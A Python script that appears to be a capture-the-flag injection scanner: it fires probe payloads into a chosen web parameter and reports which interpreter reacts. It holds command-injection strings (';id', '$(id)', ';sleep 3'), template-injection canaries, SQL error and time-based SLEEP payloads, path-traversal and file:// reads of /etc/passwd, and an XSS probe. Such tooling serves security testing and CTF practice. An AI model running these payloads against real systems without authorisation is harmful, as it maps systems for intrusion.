#!/usr/bin/env python3
"""Universal injection probe: sends class-specific canaries into one
parameter (FUZZ) and reports which interpreter reacted.

    python probe.py "http://inj1.chal.deti:8040/ping" --data "host=FUZZ"
    python probe.py "http://t/search?q=FUZZ"
    python probe.py "http://t/api" --json '{"name":"FUZZ"}'

Detects: OS cmd injection (id output / sleep), SSTI (49 / 7777777),
SQLi (DB errors / sleep), path traversal (root:x:0:0), XSS reflection, XXE n/a.
"""
import argparse
import json
import re
import time

import requests

PROBES = [
    ("cmdi", ";id", r"uid=\d+"),
    ("cmdi", "|id", r"uid=\d+"),
    ("cmdi", "`id`", r"uid=\d+"),
    ("cmdi", "$(id)", r"uid=\d+"),
    ("cmdi", "\nid", r"uid=\d+"),
    ("cmdi", "&&id", r"uid=\d+"),
    ("cmdi", "x;id;", r"uid=\d+"),
    ("cmdi-time", ";sleep 3", "SLEEP"),
    ("cmdi-time", "$(sleep 3)", "SLEEP"),
    ("cmdi-time", "\nsleep 3", "SLEEP"),
    ("ssti", "{{7*7}}", r"\b49\b"),
    ("ssti-jinja", "{{7*'7'}}", r"7777777"),
    ("ssti", "${7*7}", r"\b49\b"),
    ("ssti", "<%= 7*7 %>", r"\b49\b"),
    ("ssti", "#{7*7}", r"\b49\b"),
    ("sqli", "'", r"SQL|syntax|sqlite|mysql|MariaDB|ORA-|psql|unterminated|quoted string"),
    ("sqli", "\"", r"SQL|syntax|sqlite|mysql|MariaDB|ORA-|psql"),
    ("sqli-time", "' AND SLEEP(3)-- -", "SLEEP"),
    ("sqli-time", "1 AND SLEEP(3)", "SLEEP"),
    ("traversal", "../../../../../../etc/passwd", r"root:x:0:0"),
    ("traversal", "/etc/passwd", r"root:x:0:0"),
    ("ssrf/file", "file:///etc/passwd", r"root:x:0:0"),
    ("xss", "<zzx1y>", r"<zzx1y>"),
]


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url", help="URL; may contain FUZZ")
    ap.add_argument("--data", help="form body containing FUZZ (POST)")
    ap.add_argument("--json", help="JSON body containing FUZZ (POST)")
    ap.add_argument("-c", "--cookie")
    ap.add_argument("--prefix", default="", help="prepended to every probe (e.g. 127.0.0.1)")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def send(val):
        t0 = time.perf_counter()
        if a.json:
            body = a.json.replace("FUZZ", json.dumps(val)[1:-1])
            r = requests.post(a.url, data=body, headers={**hdr, "Content-Type": "application/json"}, timeout=20)
        elif a.data:
            from urllib.parse import quote
            r = requests.post(a.url.replace("FUZZ", quote(val)), data=a.data.replace("FUZZ", quote(val, safe="")),
                              headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
        else:
            from urllib.parse import quote
            r = requests.get(a.url.replace("FUZZ", quote(val, safe="")), headers=hdr, timeout=20)
        return r, time.perf_counter() - t0

    base, bt = send(a.prefix + "zzbaseline")
    print(f"[baseline] {base.status_code} {len(base.content)}B {bt:.2f}s")
    for cls, p, rx in PROBES:
        try:
            r, dt = send(a.prefix + p)
        except requests.RequestException as e:
            print(f"[{cls:10s}] {p!r:35} ERROR {e}")
            continue
        hit = (dt > bt + 2.5) if rx == "SLEEP" else bool(re.search(rx, r.text)) and not re.search(rx, base.text)
        flag = re.findall(r"flag\{[^}]+\}", r.text)
        print(f"[{cls:10s}] {p!r:35} {r.status_code} {len(r.content):6d}B {dt:5.2f}s {'<== HIT' if hit else ''} {flag[0] if flag else ''}")


if __name__ == "__main__":
    main()
